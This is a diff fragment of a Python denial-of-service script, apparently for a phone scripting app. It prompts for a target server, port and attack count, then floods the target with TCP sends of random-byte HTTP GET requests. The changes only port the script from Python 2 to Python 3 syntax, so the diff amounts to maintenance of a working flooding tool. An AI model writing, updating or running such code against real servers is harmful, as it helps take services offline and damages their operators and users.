@@ -1,3 +1,4 @@
+from __future__ import print_function
 import time, socket, os, sys, string, random, console
 console.set_color(255, 0, 0)
 print("\n      -+--=:=- -==- -=:=--+-")
@@ -10,7 +11,7 @@ host=raw_input(" -+- Server: ")
 port=int(input(" -+- Port: "))
 message=random._urandom(1024)
 conn=input( " -+- Attacks: " )
-print ""
+print("")
 ip = socket.gethostbyname( host )
 def dos():
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -20,7 +21,7 @@ def dos():
 		s.send( "GET /%s HTTP/1.1\r\n" % message )
 		s.sendto( "GET /%s HTTP/1.1\r\n" % message, (ip, port) )
 		s.send( "GET /%s HTTP/1.1\r\n" % message )
-	except socket.error, msg:
+	except socket.error as msg:
 		console.set_color(255, 0, 0)
 		print("-[Connection Failed]-=@=--+-")
 		console.set_color()
